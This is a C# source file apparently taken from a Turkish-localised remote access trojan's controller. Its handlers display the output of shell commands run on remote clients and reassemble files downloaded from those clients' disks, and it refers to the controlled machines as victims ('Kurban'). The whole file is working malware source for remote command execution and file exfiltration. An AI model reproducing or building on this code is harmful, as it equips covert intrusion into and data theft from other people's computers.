using System;
using System.IO;
using xServer.KuuhakuCekirdek.Ağ;
using xServer.KuuhakuCekirdek.Paketler.ClientPaketleri;
using xServer.KuuhakuCekirdek.Paketler.ServerPaketleri;
using xServer.KuuhakuCekirdek.UTIlityler;
using xServer.Formlar;

namespace xServer.KuuhakuCekirdek.Eylemler
{
    public static partial class Eylemİşleyicisi
    {
        public static void HandleDoShellExecuteResponse(Client client, DoShellExecuteResponse packet)
        {
            if (client.Value == null || client.Value.FrmRs == null || string.IsNullOrEmpty(packet.Output))
                return;

            if (packet.IsError)
                client.Value.FrmRs.PrintError(packet.Output);
            else
                client.Value.FrmRs.PrintMessage(packet.Output);
        }

        public static void HandleDoDownloadFileResponse(Client client, DoDownloadFileResponse packet)
        {
            if (CanceledDownloads.ContainsKey(packet.ID) || string.IsNullOrEmpty(packet.Filename))
                return;

            if (!Directory.Exists(client.Value.DownloadDirectory))
                Directory.CreateDirectory(client.Value.DownloadDirectory);

            string downloadPath = Path.Combine(client.Value.DownloadDirectory, packet.Filename);

            if (packet.CurrentBlock == 0 && File.Exists(downloadPath))
            {
                for (int i = 1; i < 100; i++)
                {
                    var newFileName = string.Format("{0} ({1}){2}", Path.GetFileNameWithoutExtension(downloadPath), i,
                        Path.GetExtension(downloadPath));
                    if (File.Exists(Path.Combine(client.Value.DownloadDirectory, newFileName))) continue;

                    downloadPath = Path.Combine(client.Value.DownloadDirectory, newFileName);
                    RenamedFiles.Add(packet.ID, newFileName);
                    break;
                }
            }
            else if (packet.CurrentBlock > 0 && File.Exists(downloadPath) && RenamedFiles.ContainsKey(packet.ID))
            {
                downloadPath = Path.Combine(client.Value.DownloadDirectory, RenamedFiles[packet.ID]);
            }

            if (client.Value == null || client.Value.FrmFm == null)
            {
                AnaForm.Instance.KurbanDurumuAyarla(client,
                    "İndirme iptal edildi, Lütfen Dosya Yöneticisini Açık Tutunuz.");
                new DoDownloadFileCancel(packet.ID).Execute(client);
                return;
            }

            var index = client.Value.FrmFm.GetTransferIndex(packet.ID);
            if (index < 0)
                return;

            if (!string.IsNullOrEmpty(packet.CustomMessage))
            {
                if (client.Value.FrmFm == null)
                    return;

                client.Value.FrmFm.UpdateTransferStatus(index, packet.CustomMessage, 0);
                return;
            }

            var destFile = new FileSplit(downloadPath);
            if (!destFile.AppendBlock(packet.Block, packet.CurrentBlock))
            {
                if (client.Value == null || client.Value.FrmFm == null)
                    return;

                client.Value.FrmFm.UpdateTransferStatus(index, destFile.LastError, 0);
                return;
            }

            var progress =
                Math.Round((decimal)((packet.CurrentBlock + 1) / (double)packet.MaxBlocks * 100.0), 2);

            if (client.Value == null || client.Value.FrmFm == null)
                return;

            if (CanceledDownloads.ContainsKey(packet.ID)) return;

            client.Value.FrmFm.UpdateTransferStatus(index, string.Format("İndiriliyor...({0}%)", progress), -1);

            if ((packet.CurrentBlock + 1) == packet.MaxBlocks)
            {
                if (client.Value.FrmFm == null)
                    return;
                RenamedFiles.Remove(packet.ID);
                client.Value.FrmFm.UpdateTransferStatus(index, "Tamamlandı", 1);
            }
        }

        public static void HandleSetStatusFileManager(Client client, SetStatusFileManager packet)
        {
            if (client.Value == null || client.Value.FrmFm == null) return;

            client.Value.FrmFm.SetStatus(packet.Message, packet.SetLastDirectorySeen);
        }
    }
}